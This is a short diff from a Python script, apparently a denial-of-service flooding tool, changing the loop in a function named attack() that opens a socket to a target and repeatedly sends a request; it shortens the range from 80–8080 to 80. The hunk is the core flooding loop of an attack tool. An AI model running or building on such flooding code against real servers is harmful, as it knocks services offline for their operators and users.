@@ -62,7 +62,7 @@ def attack():
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
       #Attack starts here
-      for y in range(80,8080):
+      for y in range(80):
           atk.send(str.encode(request))
     except socket.error:
       sleep(0)
